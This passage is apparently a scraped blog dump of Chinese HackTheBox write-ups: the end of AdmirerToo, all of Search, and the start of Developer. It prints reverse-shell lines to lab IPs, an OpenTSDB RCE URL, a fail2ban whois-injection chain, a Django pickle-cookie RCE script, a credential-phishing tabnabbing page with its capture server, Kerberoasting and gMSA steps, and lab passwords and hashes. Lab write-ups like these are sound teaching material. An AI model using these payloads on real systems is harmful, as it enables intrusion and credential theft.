http://127.0.0.1:4242/api/version\"version\":\"2.4.0\"python redirect.py -i 10.10.14.10 --port 7777 http://127.0.0.1:4242/api/suggest?type=metrics[\"http.stats.web.hits\"]bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.14.10/4444 &lt;&amp;1'%22bash%20-c%20'exec%20bash%20-i%20%26%3E/dev/tcp/10.10.14.10/4444%20%3C%261'%22python redirect.py -i 10.10.14.10 --port 7777 \"http://127.0.0.1:4242/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:http.stats.web.hits&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=%5B33:system(%22bash%20-c%20'exec%20bash%20-i%20%26%3E/dev/tcp/10.10.14.10/4444%20%3C%261'%22)%5D&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json\" password搜索可能存在密码配置的文件： 12345grep -iRl 'pass' /var/www/adminer/ 2&gt;/dev/null/var/www/adminer/plugins/data/servers.php/var/www/adminer/plugins/oneclick-login.php/var/www/adminer/plugins/plugin.php/var/www/adminer/adminer-included-0ae90598f37b20e3e7eb122c427729ed.php /var/www/adminer/plugins/data/server.php中获得很复杂的密码： 1234567891011121314&lt;?phpreturn [ 'localhost' =&gt; array(// 'username' =&gt; 'admirer',// 'pass' =&gt; 'bQ3u7^AxzcB7qAsxE3',// Read-only account for testing 'username' =&gt; 'admirer_ro', 'pass' =&gt; '1w4nn4b3adm1r3d2!', 'label' =&gt; 'MySQL', 'databases' =&gt; array( 'admirer' =&gt; 'Admirer DB', ) ),]; redirect.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env pythonimport SimpleHTTPServerimport SocketServerimport sysimport argparsedef redirect_handler_factory(url): \"\"\" Returns a request handler class that redirects to supplied `url` \"\"\" class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_GET(self): self.send_response(301) self.send_header('Location', url) self.end_headers() def do_POST(self): self.send_response(301) self.send_header('Location', url) self.end_headers() return RedirectHandlerdef main(): parser = argparse.ArgumentParser(description='HTTP redirect server') parser.add_argument('--port', '-p', action=\"store\", type=int, default=80, help='port to listen on') parser.add_argument('--ip', '-i', action=\"store\", default=\"\", help='host interface to listen on') parser.add_argument('redirect_url', action=\"store\") myargs = parser.parse_args() redirect_url = myargs.redirect_url port = myargs.port host = myargs.ip redirectHandler = redirect_handler_factory(redirect_url) handler = SocketServer.TCPServer((host, port), redirectHandler) print(\"serving at port %s\" % port) handler.serve_forever()if __name__ == \"__main__\": main() user flag得到的密码就是jennifer用户ssh密码： 12jenniferbQ3u7^AxzcB7qAsxE3 提权信息opencats本地8080端口另一个web，转发出来： 1ssh -L 8888:localhost:8080 jennifer@10.10.11.137 这个版本存在已知漏洞： OpenCATS PHP Object Injection to Arbitrary File Writehttps://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html servicesservice里有fail2ban 123456789101112systemctl list-units --type=service...fail2ban.service loaded active running Fail2Ban Service...jennifer@admirertoo:~$ fail2ban-server -VFail2Ban v0.10.2Copyright (c) 2004-2008 Cyril Jaquier, 2008- Fail2Ban ContributorsCopyright of modifications held by their respective authors.Licensed under the GNU General Public License v2 (GPL). Possible RCE vulnerability in mailing action using mailutils (mail-whois) · Advisory · fail2ban/fail2banhttps://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm opencatsdatabase/opt/opencats/config.php里可以得到数据库账号密码，admin hash破解不出来，但可以直接修改： 1234567891011121314151617181920212223/* Database configuration. */define('DATABASE_USER', 'cats');define('DATABASE_PASS', 'adm1r3r0fc4ts');define('DATABASE_HOST', 'localhost');define('DATABASE_NAME', 'cats_dev');MariaDB [cats_dev]&gt; select user_name,password,user_id from user\\G*************************** 1. row ***************************user_name: admin password: dfa2a420a4e48de6fe481c90e295fe97 user_id: 1*************************** 2. row ***************************user_name: cats@rootadmin password: cantlogin user_id: 1250*************************** 3. row ***************************user_name: jennifer password: f59f297aa82171cc860d76c390ce7f3e user_id: 12513 rows in set (0.001 sec)password123MariaDB [cats_dev]&gt; update user set password = '482c811da5d5b4bc6d497ffa98491e38' where user_id = 1; 反序列化任意写文件测试反序列化，发现可以以devel权限写文件，devel不能登录，但有权限写/usr/local/etc配置文件目录 1234567891011./phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/test.txt ./test.txtjennifer@admirertoo:~$ ls -al /dev/shm/test.txt-rw-r--r-- 1 devel devel 56 Jan 28 07:06 /dev/shm/test.txtjennifer@admirertoo:~$ grep 'devel' /etc/passwddevel:x:1003:1003::/home/devel:/sbin/nologinjennifer@admirertoo:~$ find / -group devel 2&gt;/dev/null/dev/shm/test.txt/opt/opencats/INSTALL_BLOCK/usr/local/src/usr/local/etc Fail2Ban查看配置，可以知道默认对ssh配置了fail2ban，当有ip被ban时会触发邮件： 根据github中漏洞描述，我们可以通过控制whois响应获得命令执行，虽然我们不能修改/etc/hosts,但可以通过opencats的反序列化写whois配置文件,但会被写入一些其他数据： 根据文档闭合，从而控制whois服务器： 1&#125;]|. [10.10.14.12] Exploit &amp; root flag整个流程就是反序列化写whois配置文件控制whois server，控制whois响应为reverse shell，ssh触发fail2ban从而触发代码执行，获得shell： 123456789101112131415./phpggc -u --fast-destruct Guzzle/FW1 /usr/local/etc/whois.conf ./test.txt# rshell file~| bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1\" &amp;# whois serverncat -nvlkp 43 -c \"cat ./rshell\"jennifer@admirertoo:~$ whois 10.10.14.12~| bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1\" &amp;ssh root@10.10.11.137cat /etc/shadowroot:$6$eP5MVyB1lXtVQgzU$H4xJdGiHfSu9JmUR80juqHC5BAca79yir2Z6bipW8s.DowTuNRo82/CjN7EMBK8lczD1AMYxgKTIp79DjN2R31:18817:0:99999:7::: 参考资料 SSRF in adminer · CVE-2021-21311 · GitHub Advisory Databasehttps://github.com/advisories/GHSA-x5r2-hj5c-8jx6 https://github.com/vrana/adminer/tree/master/adminer/drivers OpenTSDB 2.4.0 Remote Code Execution · Issue #2051 · OpenTSDB/opentsdbhttps://github.com/OpenTSDB/opentsdb/issues/2051 Possible RCE vulnerability in mailing action using mailutils (mail-whois) · Advisory · fail2ban/fail2banhttps://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm OpenCATS PHP Object Injection to Arbitrary File Writehttps://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html AdmireToo HTB | RaidForumshttps://raidforums.com/Thread-Tutorial-AdmireToo-HTB","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Search - HackTheBox","slug":"Search-HackTheBox","date":"2022-01-25T06:30:31.000Z","updated":"2022-05-05T08:31:22.909Z","comments":true,"path":"2022/01/25/Search-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/01/25/Search-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/422 10.10.11.129 端口扫描域环境： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061$ nmap -sC -sV 10.10.11.129Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 14:47 CSTNmap scan report for 10.10.11.129Host is up (0.21s latency).Not shown: 987 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Search &amp;mdash; Just Testing IIS88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-01-24 06:49:48Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=research| Not valid before: 2020-08-11T08:13:35|_Not valid after: 2030-08-09T08:13:35|_ssl-date: 2022-01-24T06:51:10+00:00; 0s from scanner time.443/tcp open ssl/http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_ssl-date: 2022-01-24T06:51:10+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=research| Not valid before: 2020-08-11T08:13:35|_Not valid after: 2030-08-09T08:13:35| tls-alpn:|_ http/1.1|_http-title: Search &amp;mdash; Just Testing IIS| http-methods:|_ Potentially risky methods: TRACE445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-01-24T06:51:10+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=research| Not valid before: 2020-08-11T08:13:35|_Not valid after: 2030-08-09T08:13:353268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-01-24T06:51:10+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=research| Not valid before: 2020-08-11T08:13:35|_Not valid after: 2030-08-09T08:13:353269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=research| Not valid before: 2020-08-11T08:13:35|_Not valid after: 2030-08-09T08:13:35|_ssl-date: 2022-01-24T06:51:10+00:00; 0s from scanner time.Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2022-01-24T06:50:34|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled and requiredService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 198.79 seconds 80 about us里一些用户名，可以做成字典： 一张图片上提示信息： 12send password to xxxIsolationIsKey? users.txt12345678910111213141516Keely LyonsDax SantiagoSierra FryeKyla StewartKaiara SpencerDave SimpsonBen ThompsonChris StewartKeely.LyonsDax.SantiagoSierra.FryeKyla.StewartKaiara.SpencerDave.SimpsonBen.ThompsonChris.Stewar Enumuserenum根据用户名字典，枚举有效用户名： 12345./kerbrute_linux_amd64 userenum users.txt -d search.htb --dc 10.10.11.1292022/01/20 10:47:33 &gt; [+] VALID USERNAME: Keely.Lyons@search.htb2022/01/20 10:47:33 &gt; [+] VALID USERNAME: Dax.Santiago@search.htb2022/01/20 10:47:33 &gt; [+] VALID USERNAME: Sierra.Frye@search.htb smb注意前面提示信息那张图，那个也是有效用户名，需要加到字典里，然后可以发现smb share： 1234567891011121314crackmapexec smb 10.10.11.129 -u users.txt -p 'IsolationIsKey?' --sharesSMB 10.10.11.129 445 RESEARCH [+] search.htb\\Hope.Sharp:IsolationIsKey?SMB 10.10.11.129 445 RESEARCH [+] Enumerated sharesSMB 10.10.11.129 445 RESEARCH Share Permissions RemarkSMB 10.10.11.129 445 RESEARCH ----- ----------- ------SMB 10.10.11.129 445 RESEARCH ADMIN$ Remote AdminSMB 10.10.11.129 445 RESEARCH C$ Default shareSMB 10.10.11.129 445 RESEARCH CertEnroll READ Active Directory Certificate Services shareSMB 10.10.11.129 445 RESEARCH helpdeskSMB 10.10.11.129 445 RESEARCH IPC$ READ Remote IPCSMB 10.10.11.129 445 RESEARCH NETLOGON READ Logon server shareSMB 10.10.11.129 445 RESEARCH RedirectedFolders$ READ,WRITESMB 10.10.11.129 445 RESEARCH SYSVOL READ Logon server share ldap使用bloodhound通过ldap收集信息，需要加下hosts： 12310.10.11.129 research.search.htb search.htbbloodhound-python -u Hope.Sharp -p &#39;IsolationIsKey?&#39; -ns 10.10.11.129 -d search.htb -c All users根据已有信息生成新的用户名字典： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107impacket-samrdump search.htb/Hope.Sharp:IsolationIsKey?@10.10.11.129AdministratorGuestkrbtgtSantino.BenjaminPayton.HarmonTrace.RyanReginald.MortonEddie.StevensCortez.HickmanChace.OneillAbril.SuarezSavanah.VelazquezAntony.RussoCameron.MelendezEdith.WallsLane.WuArielle.SchultzBobby.WolfBlaine.ZavalaMargaret.RobinsonCelia.MorenoKaitlynn.LeeKyler.AriasSaniyah.RoySarai.BooneJermaine.FrancoAlfred.ChanJamar.HoltSandra.WolfeRene.LarsonYareli.McintyreGriffin.MaddoxPrince.HobbsArmando.NashSonia.SchneiderMaeve.MannLizeth.LoveAmare.SerranoSavanah.KnoxFrederick.CuevasMarshall.SkinnerEdgar.JacobsElisha.WattsBelen.ComptonAmari.MoraCadence.ConnerKatelynn.CostaSage.HensonMaren.GuzmanNatasha.MayerChanel.BellScarlett.ParksEliezer.JordanDax.SantiagoLillie.SaundersJayla.RobertsLorelei.HuangTaniya.HardyCharlee.WilkinsonMonique.MorenoDesmond.BonillaClaudia.SharpAbbigail.TurnerYaritza.RiddleTori.MoraHugo.ForbesJolie.LeeGerman.RiceZain.HopkinsHope.SharpKylee.DavilaMelanie.SantiagoHunter.KirbyAnnabelle.WellsAda.GillespieGunnar.CallahanAarav.FryColby.RussellEve.GalvanJeramiah.FritzCade.AustinKeely.LyonsAbby.GonzalezJoy.CostaVincent.SuttonCesar.YangCamren.LunaTyshawn.PeckKeith.HesterBraeden.RasmussenAngel.AtkinsonSierra.FryeMaci.GravesJudah.FryeTristen.ChristianCrystal.GreerKayley.FergusonHaven.SummersIsabela.EstradaKaylin.BirdAngie.DuffyClaudia.PughJordan.Gregoryweb_svcTristan.Davies Kerberoastbloodhound可以发现两个 Kerberoastable账号，其中有一个web_svc是一个临时服务账号，这类账号一般易受攻击： GetUserSPNs直接用impacket自带的GetUserSPNs就能够获取到hash： 1impacket-GetUserSPNs -request -dc-ip 10.10.11.129 search.htb/Hope.Sharp:IsolationIsKey? hashcrack破解出来密码： 1@3ONEmillionbaby Enum使用得到的密码继续枚举，发现另一个用户复用这个密码： 123crackmapexec smb 10.10.11.129 -u users3.txt -p '@3ONEmillionbaby' --continue-on-successSMB 10.10.11.129 445 RESEARCH [+] search.htb\\Edgar.Jacobs:@3ONEmillionbaby smb使用这个账号继续查看smb share，发现一个xlsx： 1234smbclient &#x2F;&#x2F;search.htb&#x2F;RedirectedFolders$ -U edgar.jacobscd edgar.jacobs\\Desktop\\ get Phishing_Attempt.xlsx 可以看到有隐藏列，没有显示C： xlsxxlsx就是压缩文件，可以直接解压，删除其中的sheetProtection： 1234567unzip Phishing_Attempt.xlsxxl&#x2F;worksheets&#x2F;sheet2.xml&lt;sheetProtection algorithmName&#x3D;&quot;SHA-512&quot; hashValue&#x3D;&quot;hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39&#x2F;22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg&#x3D;&#x3D;&quot; saltValue&#x3D;&quot;U9oZfaVCkz5jWdhs9AA8nA&#x3D;&#x3D;&quot; spinCount&#x3D;&quot;100000&quot; sheet&#x3D;&quot;1&quot; objects&#x3D;&quot;1&quot; scenarios&#x3D;&quot;1&quot;&#x2F;&gt;zip -r Phishing.xlsx . 然后我们能够得到大概是内部钓鱼演练获取到的密码： user flag根据bloodhound分析结果，Sierra.Frye和Abby.Gonzalez在到域控的攻击路径中，用Sierra.Frye对应密码访问smb ，得到user.txt: 1234smbclient //search.htb/RedirectedFolders$ -U Sierra.Fryecd sierra.fryecd desktopget user.txt certificatedownloads目录里backup可以发现证书文件： 尝试导入浏览器，需要密码： staff简单的目录扫描可以知道staff是需要证书访问的： p12tool https://github.com/Ridter/p12tool 破解出来密码(比较费时间)： 123./p12tool crack -c ../staff.pfx -f ~/Tools/dict/rockyou.txtmisspissy powershell导入证书，使用账号密码登录，访问到powershell console： GMSAsierra.frye属于ITSEC组，有权限ReadGMSAPassword https://github.com/micahvandeusen/gMSADumper 1234$ python3 gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'Users or groups who can read password for BIR-ADFS-GMSA$: &gt; ITSecBIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f BIR-ADFS-GMSA$gmsa密码理论上不可破解，所以可以通过powershell直接复用： https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password 123456$user = 'BIR-ADFS-GMSA$'$gmsa = Get-ADServiceAccount -Identity $user -Properties 'msDS-ManagedPassword'$blob = $gmsa.'msDS-ManagedPassword'$mp = ConvertFrom-ADManagedPasswordBlob $blob$cred = New-Object System.Management.Automation.PSCredential $user,$mp.SecureCurrentPasswordInvoke-Command -ComputerName localhost -Credential $cred -ScriptBlock &#123;whoami&#125; Domain Admin &amp; root.txtBIR-ADFS-GMSA对Tristan.Davies有Generic all权限，而Tristan.Davies是domain admin： 所以可以直接修改Tristan.Davies的密码后登录 123Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock &#123;net user Tristan.Davies miao@1234 /domain&#125;impacket-wmiexec -dc-ip 10.10.11.129 search.htb/Tristan.Davies@10.10.11.129 hashdump已有shell加载meterpreter，hashdump： 1234Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cd69d23e4383daa5b0f42d29dba9529a:::... 参考资料 Kerberoasting without SPNs – PT SWARMhttps://swarm.ptsecurity.com/kerberoasting-without-spns/ https://github.com/Ridter/p12tool https://github.com/micahvandeusen/gMSADumper https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#reading-gmsa-password HTB Search [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Search-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Developer - HackTheBox","slug":"Developer-HackTheBox","date":"2022-01-18T07:48:58.000Z","updated":"2022-01-18T07:49:43.375Z","comments":true,"path":"2022/01/18/Developer-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/01/18/Developer-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/372 10.10.11.103 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.103Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-18 12:53 CSTNmap scan report for 10.10.11.103Host is up (0.21s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)| 256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)|_ 256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-title: Did not follow redirect to http://developer.htb/|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 75.56 seconds 80加hosts后访问,一个CTF练习平台： 110.10.11.103 developer.htb CTF注册登录后，有一些CTF练习： challenge PSE需要完成任意一个challenge后，会出现提交writeup功能： PSE这个就是PS2EXE，还原出来一个powershell，根据其中的加密函数对应解密： https://github.com/studoot/ps2exe https://github.com/buuren/powershell/blob/master/misc/encryptPassword.ps1 1DHTB&#123;P0w3rsh3lL_F0r3n51c_M4dn3s5&#125; 提交后，出现submit walkthrough功能： challenge Phished List受保护的xlsx中有一列隐藏，去除保护后在其中得到flag EASILY UNLOCK Protected Excel Sheets WITHOUT Password - YouTubehttps://www.youtube.com/watch?v=2x23vZIRYRs&amp;ab_channel=LeilaGharani 1DHTB&#123;H1dD3N_C0LuMn5_FtW&#125; challenge Lucky Guess一个elf，其中有winner函数，直接gdb之类跳过去就可以 1DHTB&#123;gOInGWITHtHEfLOW&#125; challenge RevMe.net exe,反编译，EmbeddedSecret函数中得到flag： 1DHTB&#123;TCG5_S1mPl3_R3v3r51nG_Ch4773nG3&#125; challenge Authentication64位elf，check_password函数比较两个参数，其中一个是flag Reversing Simple Rust Application [Hackthebox - Developer - Authentication] - YouTubehttps://www.youtube.com/watch?v=YrxFXvdtyDo&amp;ab_channel=0xdf 1DHTB&#123;rusty_bu5in3s5&#125; challenge PwnMe64位elf，check_password调用strcmp比较两个参数，得到密码 supersaiyan3 ，然后运行elf输入正确密码得到flag： 1DHTB&#123;b4s1c0v3rF7ow&#125; challenge Easy Encryption就是异或加密，根据flag格式前五位固定是DHBT{可以得到密钥，然后得到flag： 1DHTB&#123;XoringIsFun&#125; challenge Triple Whammy还是xor： 1DHTB&#123;XorXorXorFunFunFun&#125; check walkthrough任意一个challenge提交wp链接后，应该是管理员定是查看，大概两分钟一次 admin简单的目录扫描可以发现是django： reverse tabnabbing HackTheBox was vulnerable to reverse tabnabbing | 0xPrashant Bloghttps://blog.0xprashant.in/posts/htb-bug/ 当 Web 开发人员想要在新选项卡中打开链接时，他们会添加target=&quot;_blank&quot;到&lt;a&gt;标签中。问题是，如果该链接导向恶意页面并且没有采取缓解措施，那么该页面上的 JavaScript 实际上可以更改原始页面的位置。因此，如果您链接到网站没有的用户控制内容，这实际上只是一个问题。对此的缓解措施是也添加rel=&quot;noopener nofollow&quot;到&lt;a&gt;标签中。 我们提交的walkthrough也是这样，这里的目标是托管一个页面，以便当管理员单击链接时，它会在现在可见的新选项卡中打开。该选项卡中的 JavaScript 将反转选项卡-nab 原始选项卡以将其发送到我托管的另一个页面，该页面看起来像开发人员的登录页面。当管理员阅读完我的页面并返回时，他们会认为他们已出于某种原因注销，然后再次登录，我在此获得了凭据 exploit就是自己writeup里将返回界面设置为fake login,action指向自己的login函数记录密码 12345http:&#x2F;&#x2F;10.10.14.2:7777&#x2F;writeupcsrfmiddlewaretoken: Example1login: adminpassword: SuperSecurePassword@HTB2021 writeup.html12345678910&lt;html&gt; &lt;body&gt; &lt;h2&gt;Challenge Writeup&lt;/h2&gt; &lt;p&gt;This challenge was quite well designed! Good job by the developers at Developer for this one. I would definitely recommend it to my friends. It required critical thinking and tools like Ghidra to get the job done&lt;/p&gt; &lt;script&gt; if (window.opener) window.opener.parent.location.replace('http://10.10.14.2:7777/accounts/login/'); if (window.parent != window) window.parent.location.replace('https://10.10.14.2:7777/accounts/login/'); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; app.py123456789101112131415161718192021222324#!/usr/bin/env python3from flask import *app = Flask(__name__, template_folder='.')@app.route(\"/writeup\")def writeup(): return render_template('writeup.html')@app.route(\"/accounts/login/\", methods=['GET', 'POST'])def login(): if request.method == 'POST': print('\\n'.join([f'&#123;x[0]&#125;: &#123;x[1]&#125;' for x in request.form.items()])) return redirect(\"http://10.10.11.103/accounts/login/\", code=302) else: return render_template('loginform.html')if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=7777) loginform.html直接复制login界面后修复js,css路径： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!doctype html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\"&gt; &lt;meta name=\"description\" content=\"\"&gt; &lt;meta name=\"author\" content=\"\"&gt; &lt;link rel=\"icon\" href=\"/img/favicon.ico\"&gt; &lt;link rel=\"stylesheet\" href=\"http://developer.htb/static/css/jquery.toasts.css\"&gt; &lt;script src=\"http://developer.htb/static/js/all.min.js\" crossorigin=\"anonymous\"&gt;&lt;/script&gt; &lt;script src=\"http://developer.htb/static/js/jquery-3.2.1.min.js\"&gt;&lt;/script&gt; &lt;title&gt;Login | Developer.HTB&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link rel=\"stylesheet\" href=\"http://developer.htb/static/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\"&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=\"http://developer.htb/static/css/signin.css\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body class=\"text-center\"&gt; &lt;form class=\"form-signin\" action=\"/accounts/login\" method=\"post\"&gt; &lt;input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"Example1\"&gt; &lt;img class=\"mb-4\" src=\"http://developer.htb/static/img/logo.png\" alt=\"\" width=\"72\" height=\"72\"&gt; &lt;h1 class=\"h3 mb-3 font-weight-normal\"&gt;Welcome back!&lt;/h1&gt; &lt;label for=\"uname\" class=\"sr-only\"&gt;User Name&lt;/label&gt; &lt;input type=\"text\" id=\"id_login\" name=\"login\" placeholder=\"Username\" class=\"form-control\" required autofocus&gt; &lt;label for=\"password\" class=\"sr-only\"&gt;Password&lt;/label&gt; &lt;input type=\"password\" id=\"id_password\" name=\"password\" placeholder=\"Password\" class=\"form-control\" required&gt; &lt;button id=\"loginbtn\" class=\"btn btn-lg btn-primary btn-block\" type=\"submit\"&gt;Sign in&lt;/button&gt; &lt;a href=\"/accounts/password/reset/\" class=\"auth-link\"&gt;Forgot password?&lt;/a&gt; &lt;div class=\"text-center mt-4 font-weight-light\"&gt; Don't have an account? &lt;a href=\"/accounts/signup/\" &gt;Click here!&lt;/a&gt; &lt;p class=\"mt-5 mb-3 text-muted\"&gt;&amp;copy; Developer.HTB 2021&lt;/p&gt; &lt;/form&gt;&lt;script src=\"http://developer.htb/static/js/jquery.toast.js\"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; Djangodiango admin界面发现另一个site，加hosts后访问： developer-sentry.developer.htb账号是django admin那里得到的用户名： 1jacob@developer.htb SuperSecurePassword@HTB2021 secret执行一些操作触发报错，例如创建一个项目后再删除，报错信息中得到配置信息，包括secret： 1&#39;system.secret-key&#39;: &#39;c7f3a64aa184b7cbb1a7cbe9cd544913&#39;&#125; diango rce就是diango的cookie可以使用pickle反序列化，有secret就可以构造出任意cookie： Remote Code Execution on a Facebook server – Sec Team Bloghttps://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/ diango_rce.py123456789101112131415161718192021222324#!/usr/bin/python2import django.core.signing, django.contrib.sessions.serializersfrom django.http import HttpResponseimport cPickleimport osimport requestsimport syscmd = sys.argv[1]SECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'#Initial cookie I had on sentry when trying to reset a passwordcookie=\".eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQqVGuS55IZFFIeUGTpHcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQDm9TPf:1n9hcy:HpZvM4Joi_Uu5WcsvPd9o2xXrUY\"newContent = django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies') class PickleRce(object): def __reduce__(self): return (os.system,(cmd,))newContent['testcookie'] = PickleRce()cookie = django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True) print(\"Forged cookie:\\n\" + cookie)requests.get(\"http://developer-sentry.developer.htb/sentry/\", cookies=&#123;\"sentrysid\": cookie&#125;) Postgres/var/www/developer_ctf/developer_ctf/settings.py 里得到postgresql配置信息： /etc/sentry/sentry.conf.py 中是另一组账号密码： 123456789101112131415161718192021DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.postgresql', 'NAME': 'platform', 'USER': 'ctf_admin', 'PASSWORD': 'CTFOG2021', 'HOST': 'localhost', 'PORT': '', &#125;&#125;DATABASES = &#123; 'default': &#123; 'ENGINE': 'sentry.db.postgres', 'NAME': 'sentry', 'USER': 'sentry', 'PASSWORD': 'SentryPassword2021', 'HOST': 'localhost', 'PORT': '', &#125; &#125; 数据库中枚举信息： 12345678910111213141516psql postgresql:&#x2F;&#x2F;ctf_admin:CTFOG2021@localhost:5432&#x2F;platformpsql postgresql:&#x2F;&#x2F;sentry:SentryPassword2021@localhost:5432&#x2F;sentry entry&#x3D;# select id,username,password,is_superuser from auth_user;select id,username,password,is_superuser from auth_user;WARNING: terminal is not fully functional- (press RETURN) id | username | password | is_superuser----+---------------------+-------------------------------------------------------------------------------+-------------- 1 | karl@developer.htb | pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI&#x3D; | t 5 | jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf&#x2F;0jIG42ofI+W3vcUKts&#x3D; | t(2 rows) hash crackDjango (PBKDF2-SHA256)格式hash： 123sudo hashcat -m 10000 hash.txt /usr/share/wordlists/rockyou.txtpbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=:insaneclownposse user 